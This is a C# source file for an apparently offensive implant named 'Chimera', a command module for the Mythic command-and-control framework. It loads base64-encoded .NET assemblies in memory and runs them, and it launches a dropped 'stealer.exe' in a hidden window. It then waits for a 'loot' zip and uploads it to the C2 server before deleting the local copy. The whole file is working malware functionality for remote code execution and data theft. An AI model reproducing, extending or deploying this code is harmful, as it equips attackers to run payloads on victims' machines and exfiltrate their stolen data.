using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;

namespace Chimera.Commands
{
    // inject_assembly <base64_assembly> — load a .NET assembly from base64 and call its Run() method
    // run_stealer                        — launch stealer.exe from staging dir, wait for loot zip, upload it
    public static class InjectAssembly
    {
        private static readonly string LootPath = Path.Combine(Staging.Dir, "stealer_loot.zip");

        // stealer.exe is dropped by the DLL alongside chimera.exe.
        // Look next to the running exe first, fall back to C:\Users\Public.
        private static string GetStealerPath()
        {
            string dir = Path.GetDirectoryName(
                System.Reflection.Assembly.GetExecutingAssembly().Location) ?? "";
            string beside = Path.Combine(dir, "stealer.exe");
            return File.Exists(beside) ? beside : @"C:\Users\Public\stealer.exe";
        }
        private const int PollSec = 120;

        public static string Execute(string parameters, string taskID, string callbackUUID)
        {
            if (string.IsNullOrEmpty(parameters) || parameters.Trim() == "run_stealer")
                return RunStealer(taskID, callbackUUID);

            return InjectDotnet(parameters);
        }

        // ── inject_assembly ───────────────────────────────────────────────────────
        private static string InjectDotnet(string base64Asm)
        {
            try
            {
                byte[] asmBytes = Convert.FromBase64String(base64Asm.Trim());
                Assembly asm    = Assembly.Load(asmBytes);

                MethodInfo entry = null;
                foreach (Type t in asm.GetTypes())
                {
                    entry = t.GetMethod("Run",
                        BindingFlags.Public | BindingFlags.Static, null, Type.EmptyTypes, null);
                    if (entry != null) break;
                    entry = t.GetMethod("Main",
                        BindingFlags.Public | BindingFlags.Static, null, Type.EmptyTypes, null);
                    if (entry != null) break;
                    entry = t.GetMethod("Main",
                        BindingFlags.Public | BindingFlags.Static, null,
                        new[] { typeof(string[]) }, null);
                    if (entry != null) break;
                }

                if (entry == null)
                    return "[error] No Run() or Main() found in assembly.";

                object[] args = entry.GetParameters().Length > 0
                    ? new object[] { new string[0] }
                    : null;

                var sw  = new System.IO.StringWriter();
                var old = Console.Out;
                Console.SetOut(sw);
                try   { entry.Invoke(null, args); }
                finally { Console.SetOut(old); }

                string captured = sw.ToString().Trim();
                return captured.Length > 0
                    ? captured
                    : "[+] Assembly executed (no stdout output).";
            }
            catch (Exception ex)
            {
                return "[error] inject_assembly: " + ex.Message;
            }
        }

        // ── run_stealer ───────────────────────────────────────────────────────────
        // stealer.exe is dropped to Staging.Dir by the DLL before chimera.exe runs.
        // We simply launch it as a normal process — it writes stealer_loot.zip to
        // Staging.Dir when done.  No shellcode, no RWX allocation.
        private static string RunStealer(string taskID, string callbackUUID)
        {
            try
            {
                Staging.EnsureDir();

                string StealerExe = GetStealerPath();
                if (!File.Exists(StealerExe))
                    return "[error] stealer.exe not found at " + StealerExe;

                // Delete any stale loot zip before we start
                try { if (File.Exists(LootPath)) File.Delete(LootPath); } catch { }

                // Launch stealer.exe hidden, from its own directory
                var psi = new ProcessStartInfo(StealerExe)
                {
                    WorkingDirectory = Path.GetDirectoryName(StealerExe),
                    UseShellExecute  = false,
                    CreateNoWindow   = true,
                    WindowStyle      = ProcessWindowStyle.Hidden
                };

                Process proc = Process.Start(psi);
                if (proc == null)
                    return "[error] Failed to start stealer.exe";

                // Poll up to PollSec seconds for loot zip
                bool found = false;
                for (int i = 0; i < PollSec; i++)
                {
                    Thread.Sleep(1000);
                    if (File.Exists(LootPath)) { found = true; break; }
                }

                // Wait for the process to exit (give it a little extra time)
                try { proc.WaitForExit(5000); } catch { }

                if (!found)
                {
                    // Try one last time in case it finished right as we stopped polling
                    if (File.Exists(LootPath))
                        found = true;
                    else
                        return "[error] Stealer ran but loot zip not found at " + LootPath
                               + " within " + PollSec + " seconds.";
                }

                // Upload loot to Mythic
                string uploadResult = Upload.Execute(
                    LootPath + " stealer_loot.zip", taskID, callbackUUID);

                // Only clean up zip if upload succeeded (don't delete on error so local test can inspect it)
                bool uploadOk = !uploadResult.StartsWith("[error]");
                if (uploadOk)
                {
                    try { File.Delete(LootPath); } catch { }
                }

                return "[+] Stealer completed.\n" +
                       "    Exe:  " + StealerExe + "\n" +
                       "    Loot uploaded: " + uploadResult;
            }
            catch (Exception ex)
            {
                return "[error] run_stealer: " + ex.Message;
            }
        }
    }
}
